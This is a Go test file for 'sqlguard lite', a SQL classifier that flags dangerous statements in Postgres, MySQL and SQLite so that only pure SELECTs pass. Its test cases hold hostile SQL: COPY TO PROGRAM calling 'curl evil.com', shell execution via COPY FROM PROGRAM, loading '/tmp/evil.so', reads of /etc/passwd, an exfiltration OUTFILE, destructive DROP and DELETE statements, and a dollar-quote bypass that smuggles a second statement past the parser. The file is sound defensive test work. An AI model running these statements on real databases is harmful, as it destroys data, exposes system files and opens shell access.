package lite_test

import (
	"testing"

	"github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard"
	_ "github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard/lite"
)

// All three dialects must register.
func TestLite_AllDialectsRegistered(t *testing.T) {
	for _, d := range []string{"postgres", "mysql", "sqlite"} {
		if _, ok := sqlguard.Get(d); !ok {
			t.Errorf("dialect %q not registered", d)
		}
	}
}

// PG: every attack class from the breakage suite must be detected.
func TestLite_Postgres_AttackClasses(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		// At least one of these flags must be set to signal danger to
		// the engine. A pure-SELECT with no flag would slip through
		// any "top_level_kinds: [SELECT] + no_dynamic_sql + no_program_exec"
		// rule.
		check func(c sqlguard.Classification) bool
	}{
		// Statement-shape detection
		{"DROP TABLE", "DROP TABLE users",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"DELETE", "DELETE FROM users",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"UPDATE", "UPDATE users SET email='x'",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"INSERT", "INSERT INTO users VALUES (1)",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"GRANT", "GRANT ALL ON users TO PUBLIC",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"TRUNCATE", "TRUNCATE TABLE users",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"ALTER", "ALTER TABLE users ADD COLUMN x INT",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		{"CREATE TABLE", "CREATE TABLE foo (id INT)",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		// Dynamic SQL primitives
		{"DO block", "DO $$ BEGIN EXECUTE 'DR'||'OP TABLE users'; END $$;",
			func(c sqlguard.Classification) bool { return c.UsesDynamicSQL || !c.IsPureSelect() }},
		{"CALL", "CALL pg_terminate_backend(1)",
			func(c sqlguard.Classification) bool { return c.UsesDynamicSQL || !c.IsPureSelect() }},
		{"PREPARE", "PREPARE p AS DROP TABLE users",
			func(c sqlguard.Classification) bool { return c.UsesDynamicSQL || !c.IsPureSelect() }},
		{"EXECUTE", "EXECUTE p",
			func(c sqlguard.Classification) bool { return c.UsesDynamicSQL || !c.IsPureSelect() }},
		{"CREATE FUNCTION", "CREATE FUNCTION f() RETURNS void AS $$ BEGIN END $$ LANGUAGE plpgsql",
			func(c sqlguard.Classification) bool { return c.UsesDynamicSQL || !c.IsPureSelect() }},
		// Shell-via-DB
		{"COPY FROM PROGRAM", "COPY users FROM PROGRAM 'whoami'",
			func(c sqlguard.Classification) bool { return c.UsesProgram }},
		{"COPY TO PROGRAM", "COPY users TO PROGRAM 'curl evil.com'",
			func(c sqlguard.Classification) bool { return c.UsesProgram }},
		// LOAD
		{"LOAD shared lib", "LOAD '/tmp/evil.so'",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		// SET ROLE
		{"SET ROLE", "SET ROLE postgres",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
		// Modifying CTE — the proof point
		{"WITH d AS (DELETE...) SELECT", "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d",
			func(c sqlguard.Classification) bool { return c.MutatesViaCTE }},
		{"WITH u AS (UPDATE...) SELECT", "WITH u AS (UPDATE users SET email='x' RETURNING id) SELECT * FROM u",
			func(c sqlguard.Classification) bool { return c.MutatesViaCTE }},
		{"WITH i AS (INSERT...) SELECT", "WITH i AS (INSERT INTO users VALUES (1,'evil') RETURNING id) SELECT * FROM i",
			func(c sqlguard.Classification) bool { return c.MutatesViaCTE }},
		// Multi-statement
		{"multi-stmt", "SELECT 1; DROP TABLE users",
			func(c sqlguard.Classification) bool { return c.StmtCount > 1 || !c.IsPureSelect() }},
		// EXPLAIN — not a SELECT
		{"EXPLAIN ANALYZE DELETE", "EXPLAIN ANALYZE DELETE FROM users",
			func(c sqlguard.Classification) bool { return !c.IsPureSelect() }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", c.sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			if !c.check(cl) {
				t.Errorf("attack %q classified as benign: %+v", c.sql, cl)
			}
		})
	}
}

// Clean SELECTs must remain allowed.
func TestLite_Postgres_CleanSelects(t *testing.T) {
	cases := []string{
		"SELECT 1",
		"SELECT id, email FROM users",
		"SELECT count(*) FROM payments",
		"SELECT u.id, p.amount FROM users u JOIN payments p ON p.user_id = u.id",
		"WITH q AS (SELECT 1) SELECT * FROM q",
		"WITH RECURSIVE r AS (SELECT 1 UNION SELECT n+1 FROM r WHERE n < 10) SELECT * FROM r",
	}
	for _, sql := range cases {
		t.Run(sql, func(t *testing.T) {
			cl, _ := sqlguard.Classify("postgres", sql)
			if !cl.IsPureSelect() {
				t.Errorf("clean SELECT classified as non-pure: %q → %+v", sql, cl)
			}
			if cl.MutatesViaCTE {
				t.Errorf("clean SELECT flagged as MutatesViaCTE: %q", sql)
			}
		})
	}
}

// Function-call collection.
func TestLite_Postgres_DangerousFunctions(t *testing.T) {
	cases := map[string]string{
		"SELECT pg_read_file('/etc/passwd')":         "pg_read_file",
		"SELECT pg_terminate_backend(1)":             "pg_terminate_backend",
		"SELECT pg_read_binary_file('/etc/passwd')":  "pg_read_binary_file",
		"SELECT lo_import('/etc/passwd')":            "lo_import",
		"SELECT * FROM dblink('host=evil','SELECT 1') AS t(c int)": "dblink",
	}
	for sql, want := range cases {
		t.Run(want, func(t *testing.T) {
			cl, _ := sqlguard.Classify("postgres", sql)
			found := false
			for _, fn := range cl.Functions {
				if fn == want {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("function %q not collected from %q (got %v)", want, sql, cl.Functions)
			}
		})
	}
}

// MySQL attack classes.
func TestLite_MySQL_AttackClasses(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		bad  bool
	}{
		{"DROP TABLE", "DROP TABLE users", true},
		{"DELETE", "DELETE FROM users", true},
		{"REPLACE", "REPLACE INTO users VALUES (1,'a')", true},
		{"LOAD DATA INFILE", "LOAD DATA INFILE '/etc/passwd' INTO TABLE users", true},
		{"SELECT INTO OUTFILE", "SELECT * INTO OUTFILE '/tmp/exfil' FROM users", true},
		{"SELECT load_file", "SELECT load_file('/etc/passwd')", true},
		{"clean SELECT", "SELECT id FROM users", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cl, _ := sqlguard.Classify("mysql", c.sql)
			// "bad" = some flag should be set OR not pure SELECT
			bad := !cl.IsPureSelect() || cl.UsesProgram || cl.UsesDynamicSQL
			if bad != c.bad {
				t.Errorf("got bad=%v want %v for %q: %+v", bad, c.bad, c.sql, cl)
			}
		})
	}
}

// WITH ... <DML> — the post-CTE keyword is the real top-level.
// Pre-fix, lite classified these as SELECT because WITH was in the
// SELECT keyword set; KeywordPastWith now walks past the CTE.
func TestLite_Postgres_WithThenDML_NotSelect(t *testing.T) {
	cases := []string{
		"WITH x AS (SELECT 1) DELETE FROM users",
		"WITH x AS (SELECT 1) UPDATE users SET email='x'",
		"WITH x AS (SELECT 1) INSERT INTO users VALUES (99,'evil')",
		"WITH x AS (SELECT 1) MERGE INTO users USING src ON users.id=src.id WHEN MATCHED THEN DELETE",
		"WITH a AS (SELECT 1), b AS (SELECT 2) DELETE FROM users WHERE id < 100",
		"WITH RECURSIVE r AS (SELECT 1 UNION SELECT n+1 FROM r WHERE n < 10) DELETE FROM logs",
		"WITH x AS NOT MATERIALIZED (SELECT 1) UPDATE users SET email='x'",
	}
	for _, sql := range cases {
		t.Run(sql[:min(50, len(sql))], func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			if cl.IsPureSelect() {
				t.Errorf("WITH+DML classified as pure SELECT: %q → %+v", sql, cl)
			}
		})
	}
	// Sanity: WITH+SELECT (the legit case) still classifies as SELECT.
	cl, _ := sqlguard.Classify("postgres", "WITH x AS (SELECT 1) SELECT * FROM x")
	if !cl.IsPureSelect() {
		t.Errorf("WITH+SELECT overblocked")
	}
}

// Dollar-quote tag scan must reject dots. Pre-fix, $a.b$ was
// accepted as an opener (because the tag scan used isIdentCont which
// allows '.'), letting an attacker bleed content past PG's actual
// tag parser into the policy decision.
func TestLite_Postgres_DollarQuoteTagRestricted(t *testing.T) {
	// $$valid$$ — empty-tag dollar string
	if cl, err := sqlguard.Classify("postgres", "SELECT $$ inside $$"); err != nil || !cl.IsPureSelect() {
		t.Errorf("empty-tag dollar-string broke: err=%v cl=%+v", err, cl)
	}
	// $valid_tag$body$valid_tag$ — alphanumeric tag works
	if cl, err := sqlguard.Classify("postgres", "SELECT $tag$ body $tag$"); err != nil || !cl.IsPureSelect() {
		t.Errorf("alphanumeric-tag broke: err=%v cl=%+v", err, cl)
	}
	// $a.b$ ... ; ... $a.b$ — the bypass attempt. Pre-fix, the
	// tokenizer accepted `$a.b$` as a single-span dollar-quote
	// opener-and-closer (because `.` was in isIdentCont), masking
	// the embedded `;` from SplitTopLevelStatements and the second
	// statement INSERT INTO logs. Post-fix, `.` is not a valid tag
	// char; the strip leaves the `;` visible so multi-statement
	// detection fires, IsPureSelect is false.
	cl, _ := sqlguard.Classify("postgres", "SELECT 1 $a.b$ ; INSERT INTO logs VALUES (1) $a.b$ ;")
	if cl.IsPureSelect() {
		t.Errorf("dollar-quote-with-dot bypass: classified as pure SELECT: %+v", cl)
	}
}

// Table extraction — closes `TABLE pg_authid` + information_schema
// probes. Catches the SELECT-shorthand bypass.
func TestLite_Postgres_TableExtraction(t *testing.T) {
	cases := []struct {
		sql    string
		expect []string
	}{
		{"SELECT * FROM users", []string{"users"}},
		{"SELECT * FROM pg_catalog.pg_authid", []string{"pg_catalog.pg_authid"}},
		{"TABLE pg_authid", []string{"pg_authid"}},
		{"SELECT u.id, p.amount FROM users u JOIN payments p ON p.user_id = u.id", []string{"users", "payments"}},
		{"SELECT * FROM information_schema.tables", []string{"information_schema.tables"}},
		{"INSERT INTO logs VALUES (1)", []string{"logs"}},
		{"UPDATE users SET email='x'", []string{"users"}},
		{"DELETE FROM users", []string{"users"}},
		// CTE names are not real tables — must be excluded.
		{"WITH q AS (SELECT 1) SELECT * FROM q", nil},
		{"WITH a AS (SELECT * FROM users) SELECT * FROM a", []string{"users"}},
	}
	for _, c := range cases {
		cl, _ := sqlguard.Classify("postgres", c.sql)
		// Compare as sets.
		got := map[string]struct{}{}
		for _, t := range cl.Tables {
			got[t] = struct{}{}
		}
		for _, want := range c.expect {
			if _, ok := got[want]; !ok {
				t.Errorf("%q: missing table %q (got %v)", c.sql, want, cl.Tables)
			}
		}
	}
}

// SQLite attack classes.
func TestLite_SQLite_AttackClasses(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		bad  bool
	}{
		{"DROP TABLE", "DROP TABLE users", true},
		{"DELETE", "DELETE FROM users", true},
		{"ATTACH DATABASE", "ATTACH DATABASE '/etc/passwd' AS x", true},
		{"PRAGMA writable_schema", "PRAGMA writable_schema = ON", true},
		{"clean SELECT", "SELECT id FROM users", false},
		{"WITH cte SELECT", "WITH q AS (SELECT 1) SELECT * FROM q", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cl, _ := sqlguard.Classify("sqlite", c.sql)
			bad := !cl.IsPureSelect() || cl.UsesProgram || cl.UsesDynamicSQL || cl.MutatesViaCTE
			if bad != c.bad {
				t.Errorf("got bad=%v want %v for %q: %+v", bad, c.bad, c.sql, cl)
			}
		})
	}
}
